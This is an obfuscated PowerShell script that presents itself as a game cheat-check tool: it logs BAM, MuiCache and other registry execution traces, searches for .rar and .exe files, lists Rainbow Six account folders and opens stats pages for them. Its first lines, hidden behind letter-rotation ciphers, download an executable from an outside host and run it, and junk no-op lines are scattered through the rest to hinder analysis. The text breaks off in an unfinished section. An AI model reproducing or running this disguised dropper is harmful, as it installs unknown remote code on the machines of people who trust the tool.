$exeUrl  = $(-join('pbbxa://21aidiom.wvtqvm/eqv52.mfm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
$exePath = ($env + $(-join(':HSAD\kwb52.sls'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})))

Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

Start-Process $exePath



Clear-Host
$encodedTitle = $(-join('F3YaNMGaORQRtHQpOMaop2zvq24vGVaoN29nOP=='.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}}))
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText
function Get-OneDrivePath {
    try {
        # Attempt to retrieve OneDrive path from registry
        $oneDrivePath = (Get-ItemProperty $(-join('QTLD:\Bxocfjan\Vrlaxbxoc\XwnMaren'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) -Name $(-join('JhtgUdastg'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}}))).UserFolder
        if (-not $oneDrivePath) {
            Write-Warning $(-join('TsjIwnaj ufym sty ktzsi ns wjlnxywd. Fyyjruynsl fqyjwsfynaj ijyjhynts...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))
            # Attempt to find OneDrive path using environment variables
            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, $(-join('KjaZnera'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}})))
            if (Test-Path $envOneDrive) {
                $oneDrivePath = $envOneDrive
                Write-Host ($(-join('QpgFtkxg rcvj fgvgevgf wukpi gpxktqpogpv xctkcdng: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}})) + $oneDrivePath) -ForegroundColor Green
            } else {
                Write-Error $(-join('Slyzjc rm dglb MlcBpgtc nyrf ysrmkyrgayjjw.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}}))
            }
        }
        return $oneDrivePath
    } catch {
        Write-Error ($(-join('Dwjkun cx orwm XwnMaren yjcq: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) + $_)
        return $null
    }
}
$Z74H = Get-Random -Minimum 1000 -Maximum 9999; $ad3Gry = $($Z74H / 2); $Z74H = $ad3Gry * 2; $Z74H = $null; $ad3Gry = $null
function Format-Output {
    param($name, $value)
    $(-join('{0} : {1}'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) -f $name, $value -replace $(-join('Zfzalt.Ifal\[\]'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})), ''
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @(($(-join('R:\Jhtgh\'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) + $userName + $(-join('\Bmaskclrq\Kw Eykcq\Pyglzmu Qgv - Qgcec'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}}))),($oneDrivePath + $(-join('\Zkyqiajpo\Iu Cwiao\Nwejxks Oet - Oeaca'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}}))))
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    # Remove duplicates if the same username is found in both paths
    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Output $(-join('F6 rwfsqhcfm bch tcibr.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
    } else {
        return $uniqueUserNames
    }
}
@{ Key = $(-join('6pjj1'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) }.GetType().Name | Out-Null

function Find-RarAndExeFiles {
    Write-Output $(-join('Qtyotyr .clc lyo .pip qtwpd...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}}))
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Vwkclgh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('JwWbyweFiam.nrn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}}))
    $oneDriveFileHeader = $(-join('`m-----------------`mNmdCqhud Ehkdr:`m'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}}))
    $oneDriveFiles = @()
    $allFiles = @()

    $rarSearchPaths = @()
    Get-PSDrive -PSProvider $(-join('LorkYeyzks'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) | ForEach-Object { $rarSearchPaths += $_.Root }
    $oneDrivePath = Get-OneDrivePath
    if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }

    # Prepare script blocks for concurrent execution
    $jobs = @()

    # Define script block for finding .rar files
    $rarJob = {
        param ($searchPaths, $oneDriveFiles)
        $allFiles = @()
        foreach ($path in $searchPaths) {
            Get-ChildItem -Path $path -Recurse -Filter $(-join('*.dmd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = ($($_.FullName) + $(-join(' - Rgyz Sujolokj: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) + $($_.LastWriteTime))
                $allFiles += $fileInfo
                if ($_.FullName -like $(-join('*CbsRfwjs*'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))) { $oneDriveFiles += $_.FullName }
            }
        }
        return $allFiles
    }

    # Define script block for finding .exe files
    $exeJob = {
        param ($oneDrivePath, $oneDriveFiles)
        $exeFiles = @()
        if ($oneDrivePath) {
            Get-ChildItem -Path $oneDrivePath -Recurse -Filter $(-join('*.tmt'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = ($($_.FullName) + $(-join(' - Xmef Yapuruqp: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) + $($_.LastWriteTime))
                $exeFiles += $fileInfo
                if ($_.FullName -like $(-join('*LkbAofsb*'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))) { $oneDriveFiles += $_.FullName }
            }
        }
        return $exeFiles
    }

    # Start jobs
    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $oneDriveFiles
    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $oneDriveFiles

    # Wait for all jobs to complete and receive their output
    $jobs | ForEach-Object {
        Wait-Job $_ | Out-Null  # Suppress job completion output
        $allFiles += Receive-Job $_  # Receive job output
        Remove-Job $_  # Clean up job
    }

    $groupedFiles = $allFiles | Sort-Object

    if ($oneDriveFiles.Count -gt 0) {
        Add-Content -Path $outputFile -Value $oneDriveFileHeader
        $oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }

    if ($groupedFiles.Count -gt 0) {
        $groupedFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
    }
}

Get-Command -Name $(-join('Zulwh-Krvw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) | Select-Object -ExpandProperty Name | Out-Null

function Find-SusFiles {
    Write-Output $(-join('Cfkafkd prpmfzflrp cfibp kxjbp...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Lmasbwx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('ZmMromuVyqc.dhd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))
    $susFilesHeader = $(-join('`z-----------------`zEge Ruxqe:`z'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match $(-join('mpbefs.*\.fyf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))) { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    } else {
        Write-Output $(-join('Ehz ybex ghm yhngw. Ngtuex mh lxtkva yhk lnlibvbhnl ybexl.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))
    }
}
@{ Key = $(-join('xfb8x'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) }.GetType().Name | Out-Null

function List-BAMStateUserSettings {
    Write-Host $(-join('Advvxcv gtv tcigxth xchxst EdltgHwtaa...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) -ForegroundColor DarkYellow
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Vwkclgh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('SfFkhfnOrjv.waw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))
    if (Test-Path $outputFile) { Clear-Content $outputFile }
    $loggedPaths = @{}
     Write-Host $(-join(' Jixglmrk YwivWixxmrkw Irxvmiw '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})) -ForegroundColor Blue
    # Log entries from bam\State\UserSettings
    $registryPath = $(-join('VYZA:\GMGHSA\QiffsbhQcbhfczGsh\Gsfjwqsg\poa\Ghohs\IgsfGshhwbug'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like $(-join('*1001'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}})) }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value ($(-join('`o'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) + $($setting.PSPath))
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match $(-join('bub'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) -or $item.Name -match $(-join('.tct'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($item.Name)) {
                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host $(-join('Bc fszsjobh igsf gshhwbug tcibr.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})) -ForegroundColor Red
    }
Write-Host $(-join('Nmbkpqvo Kwuxibqjqtqbg Iaaqabivb Mvbzqma'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
    # Log entries from Compatibility Assistant Store
    $compatRegistryPath = $(-join('ZCUM:\KGXLOSJW\Eaujgkgxl\Oafvgok FL\UmjjwflNwjkagf\ShhUgehslXdsyk\Ugehslatadalq Skkaklsfl\Klgjw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match $(-join('kdk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) -or $_.Name -match $(-join('.ktk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
            Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }
Write-Host $(-join('Nmbkpqvo IxxaAeqbkpml Mvbzqma'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})) -ForegroundColor Blue
    # Log entries from FeatureUsage\AppSwitched
    $newRegistryPath = $(-join('UXPH:\FBSGJNER\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Rkcybere\SrngherHfntr\NccFjvgpurq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match $(-join('xqx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) -or $_.Name -match $(-join('.fof'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }
Write-Host $(-join('Cbqzefkd JrfZxzeb Bkqofbp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) -ForegroundColor Blue
    # Log entries from MuiCache
    $muiCachePath = $(-join('ILDS:\Mpdbm Tfuujoht\Tpguxbsf\Njdsptpgu\Xjoepxt\Tifmm\NvjDbdif'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match $(-join('hah'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) -or $_.Name -match $(-join('.mvm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}}))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch $(-join('\{.*\}'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}})) } | ForEach-Object { $_ -replace $(-join(':'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})), '' } | Set-Content $outputFile

    Log-BrowserFolders
    # Remove the placeholder Log-MUICacheEntries function call if not defined elsewhere
  
    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    Add-Content -Path $outputFile -Value $(-join('`o-----------------'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))
    Add-Content -Path $outputFile -Value $(-join('`sW6 Zxjwsfrjx:'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))

    foreach ($name in $folderNames) {
        Add-Content -Path $outputFile -Value $name
        $url = ($(-join('cookn://novon.xx/ndzbz/'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}})) + $name)
        Write-Host ($(-join('Stirmrk wxexw jsv '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})) + $name + $(-join(' gf Klslk.uu ...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))) -ForegroundColor Blue
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}
Write-Host $(-join(' Dcrafgle Bmuljmybcb Zpmuqcpq '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) -ForegroundColor Blue
function Log-BrowserFolders {
    Write-Host $(-join('Wzrrtyr cpr pyectpd tydtop AzhpcDspww...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}})) -ForegroundColor DarkYellow
    $registryPath = $(-join('VYZA:\GCTHKOFS\Qzwsbhg\GhofhAsbiWbhsfbsh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Bcqirmn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('ObBgdbjKnfr.sws'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}}))
    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        Add-Content -Path $outputFile -Value $(-join('`a-----------------'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))
        Add-Content -Path $outputFile -Value $(-join('`rFvsawiv Jsphivw:'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}}))
        foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
    } else {
        Write-Host $(-join('Pcegqrpw nyrf dmp zpmuqcpq lmr dmslb.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) -ForegroundColor Red
    }
}
Get-Command -Name $(-join('Xsjuf-Iptu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) | Select-Object -ExpandProperty Name | Out-Null

function Log-WindowsInstallDate {
    Write-Host $(-join('Bewwydw Mydtemi ydijqbb tqju...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})) -ForegroundColor DarkYellow
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $desktopPath = [System.Environment]::GetFolderPath($(-join('Hiwoxst'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})))
    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('ZmMromuVyqc.dhd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))
    Add-Content -Path $outputFile -Value $(-join('`t-----------------'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}}))
    Add-Content -Path $outputFile -Value ($(-join('`oXjoepxt Jotubmmbujpo Ebuf: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})) + $installDate)
}
$m2ivc4e = Get-Random -Minimum 1000 -Maximum 9999; $DzOz = $($m2ivc4e / 2); $m2ivc4e = $DzOz * 2; $m2ivc4e = $null; $DzOz = $null

$PID | Out-Null
List-BAMStateUserSettings
Log-WindowsInstallDate
Find-RarAndExeFiles
Find-SusFiles

$desktopPath = [System.Environment]::GetFolderPath($(-join('Tuiajef'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})))
# Copy the log file to clipboard
$logFilePath = Join-Path -Path $desktopPath -ChildPath $(-join('MzZebzhIldp.quq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))

if (Test-Path $logFilePath) {
    Set-Clipboard -Path $logFilePath
    Write-Host $(-join('Ild cfib zlmfba ql zifmylxoa.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) -ForegroundColor DarkRed
} else {
    Write-Host $(-join('Fia zcfy hin ziohx ih nby xymenij.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) -ForegroundColor Red
}
# Paths to Desktop and Downloads folders
$desktopPath = [System.Environment]::GetFolderPath($(-join('Rsgyhcd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})))

# Get the user's profile folder
$userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)

# Construct the path to the Downloads folder
$downloadsPath = Join-Path -Path $userProfile -ChildPath $(-join('Lwevtwila'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))

# Function to delete a file if it exists
function Delete-FileIfExists {
    param (
        [string]$filePath
    )
    if (Test-Path $filePath) {
        Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue
    }
}
Full paths to the target file in Desktop and Downloads folders
